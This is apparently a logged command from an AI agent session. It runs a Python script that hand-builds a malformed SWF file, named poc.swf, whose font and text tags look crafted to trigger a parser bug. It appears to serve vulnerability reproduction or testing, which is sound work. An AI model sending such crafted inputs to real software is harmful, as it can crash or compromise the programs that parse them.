Running command: cd /workspace && python3 - <<'PY'
import struct
class BW:
    def __init__(self): self.bits=[]
    def b(self,v,n):
        if v<0: v=(1<<n)+v
        for i in range(n-1,-1,-1): self.bits.append((v>>i)&1)
    def align(self):
        while len(self.bits)%8: self.bits.append(0)
    def bytes(self):
        self.align(); out=bytearray()
        for i in range(0,len(self.bits),8):
            b=0
            for bit in self.bits[i:i+8]: b=(b<<1)|bit
            out.append(b)
        return bytes(out)

def rect():
    bw=BW(); bw.b(1,5); bw.b(0,1); bw.b(0,1); bw.b(0,1); bw.b(0,1); bw.align(); return bw.bytes()
def matrix():
    bw=BW(); bw.b(0,1); bw.b(0,1); bw.b(0,1); bw.b(0,1); bw.b(0,1); bw.b(0,1); bw.b(0,1); bw.b(0,1); bw.align(); return bw.bytes()
def tag(code,payload):
    l=len(payload)
    hdr=(code<<6)
    return struct.pack('<H', hdr|l)+payload
# SWF header
body=bytearray()
# DefineFont2 tag (48)
font=bytearray()
font += struct.pack('<H',1)
font += bytes([0b00000011])
font += b'\x00'
font += b'\x01A'
font += struct.pack('<H',1)
font += struct.pack('<H',4)
font += struct.pack('<H',6)
font += b'\x00\x00'
font += b'\x41'
body += tag(48,font)
# DefineText2 tag (33)
text=bytearray()
text += struct.pack('<H',2)
text += rect()
text += matrix()
text += b'\x00\x00'  # glyph bits=0, adv bits=0
# state change: has_font=1 only
text += b'\x80' + struct.pack('<H',1) + struct.pack('<H',10)
# glyph record: flag=0, count=1, index=1, adv=0
text += b'\x01' + b'\x01' + b'\x00'
# end record
text += b'\x00'
body += tag(33,text)
body += tag(0,b'')
header=b'FWS'+bytes([6])+struct.pack('<I', 8+len(body))
open('/workspace/poc.swf','wb').write(header+body)
print('wrote', len(header+body))
